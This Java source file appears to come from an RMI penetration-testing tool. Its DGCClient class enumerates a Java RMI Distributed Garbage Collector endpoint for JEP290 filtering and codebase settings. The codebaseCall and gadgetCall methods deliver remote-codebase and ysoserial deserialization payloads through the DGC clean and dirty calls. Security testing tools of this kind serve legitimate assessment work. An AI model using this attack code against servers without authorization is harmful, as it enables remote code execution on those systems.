package de.qtc.rmg.operations;

import java.rmi.server.ObjID;
import java.util.HashMap;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.MaliciousOutputStream;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.utils.DefinitelyNonExistingClass;

public class DGCClient {

    private RMIWhisperer rmi;

    private static final long interfaceHash = -669196253586618813L;
    private static final ObjID objID = new ObjID(ObjID.DGC_ID);

    public DGCClient(RMIWhisperer rmiRegistry)
    {
        this.rmi = rmiRegistry;
    }

    public void enumDGC(String callName)
    {
        try {
            Logger.printlnBlue("RMI DGC enumeration:");
            Logger.println("");
            Logger.increaseIndent();

            MaliciousOutputStream.setDefaultLocation("InvalidURL");
            dgcCall(callName, packArgsByName(callName, new DefinitelyNonExistingClass()), true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);
            Throwable c = ExceptionHandler.getThrowable("ClassNotFoundException", e);

            if( c != null ) {

                if( c.getMessage().contains("no security manager: RMI class loader disabled") ) {
                    Logger.printlnMixedYellow("- RMI server", "does not", "use a SecurityManager during DGC operations.");
                    Logger.printlnMixedYellow("  --> Remote class loading attacks", "are not", "possible.");
                    Logger.statusOutdated();
                    ExceptionHandler.showStackTrace(e);

                } else if( c.getMessage().contains("access to class loader denied") ) {
                    Logger.printlnMixedYellow("- Security Manager", "rejected access", "to the class loader.");
                    Logger.printlnMixedBlue("  --> The DGC uses most likely a", "separate security policy.");
                    Logger.statusDefault();
                    ExceptionHandler.showStackTrace(e);

                } else if( c.getMessage().equals("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
                    Logger.printlnMixedYellow("- RMI server", "did not", "attempt to parse the supplied codebase.");
                    Logger.printlnMixedBlue("  --> DGC is most likely configured with", "useCodebaseOnly=false.");
                    Logger.statusDefault();
                    ExceptionHandler.showStackTrace(e);

                } else {
                    ExceptionHandler.unexpectedException(e, "DGC", "enumeration", false);
                }

            } else if( t instanceof java.net.MalformedURLException) {
                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during " + callName + " call.");
                Logger.printMixedBlue("  --> The DGC", "attempted to parse", "the provided codebase ");
                Logger.printlnPlainYellow("(useCodebaseOnly=false).");
                Logger.statusNonDefault();
                ExceptionHandler.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "DGC", "enumeration", false);
            }

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "DGC", "enumeration", false);

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    public void enumJEP290(String callName)
    {
        try {
            Logger.printlnBlue("RMI server JEP290 enumeration:");
            Logger.println("");
            Logger.increaseIndent();

            dgcCall(callName, packArgsByName(callName, new HashMap<String,String>()), false);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                Logger.printMixedYellow("- DGC", "rejected", "deserialization of");
                Logger.printPlainBlue(" java.util.HashMap");
                Logger.printlnPlainYellow(" (JEP290 is installed).");
                Logger.statusOk();
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                Logger.printMixedYellow("- DGC", "accepted", "deserialization of");
                Logger.printPlainBlue(" java.util.HashMap");
                Logger.printlnPlainYellow(" (JEP290 is not installed).");
                Logger.statusVulnerable();
                ExceptionHandler.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "JEP290", "enumeration", false);
            }

        } catch( java.lang.ClassCastException e ) {
            Logger.printMixedYellow("- DGC", "accepted", "deserialization of");
            Logger.printPlainBlue(" java.util.HashMap");
            Logger.printlnPlainYellow(" (JEP290 is not installed).");
            Logger.statusVulnerable();
            ExceptionHandler.showStackTrace(e);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "JEP290", "enumeration", false);

        } finally {
            Logger.decreaseIndent();
        }
    }

    public void codebaseCall(String callName, Object payloadObject)
    {
        String className = payloadObject.getClass().getName();

        try {
            Logger.printlnBlue("Attempting codebase attack on DGC endpoint...");
            Logger.print("Using class ");
            Logger.printPlainMixedBlueFirst(className, "with codebase", System.getProperty("java.rmi.server.codebase"));
            Logger.printlnPlainMixedYellow(" during", callName, "call.");
            Logger.println("");
            Logger.increaseIndent();

            dgcCall(callName, packArgsByName(callName, payloadObject), false);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "DGC", className);
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                ExceptionHandler.unsupportedClassVersion(e, callName, "call");

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains("RMI class loader disabled") ) {
                ExceptionHandler.codebaseSecurityManager(e);

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains(className)) {
                ExceptionHandler.codebaseClassNotFound(e, className);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.codebaseClassCast(e, false);

            } else if( cause instanceof java.security.AccessControlException) {
                ExceptionHandler.accessControl(e, callName, "call");

            } else {
                ExceptionHandler.unexpectedException(e, callName, "call", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.codebaseClassCast(e, false);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, callName, "call", false);
        }
    }

    public void gadgetCall(String callName, Object payloadObject)
    {
        try {
            Logger.printlnBlue("Attempting ysoserial attack on DGC endpoint...");
            Logger.println("");
            Logger.increaseIndent();

            dgcCall(callName, packArgsByName(callName, payloadObject), false);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "DGC", "gadget-class");

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                ExceptionHandler.deserializeClassNotFound(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.deserlializeClassCast(e, false);

            } else {
                ExceptionHandler.unknownDeserializationException(e);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.deserlializeClassCast(e, false);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, callName, "call", false);
        }
    }

    private void dgcCall(String callName, Object[] callArguments, boolean maliciousStream) throws Exception
    {
        rmi.genericCall(objID, getCallByName(callName), interfaceHash, callArguments, maliciousStream, callName);
    }

    private int getCallByName(String callName)
    {
        switch(callName) {
            case "clean":
                return 0;
            case "dirty":
                return 1;
            default:
                ExceptionHandler.internalError("DGCClient.getCallIDByName", "Unable to find callID for method '" + callName + "'.");
        }

        return 0;
    }

    private Object[] packArgsByName(String callName, Object payloadObject)
    {
        switch(callName) {
            case "clean":
                return new Object[] {new ObjID[]{}, 0L, payloadObject, true};
            case "dirty":
                return new Object[] {new ObjID[]{}, 0L, payloadObject};
            default:
                ExceptionHandler.internalError("DGCClient.packArgsByName", "Unable to find pack strategie for method '" + callName + "'.");
        }

        return null;
    }
}
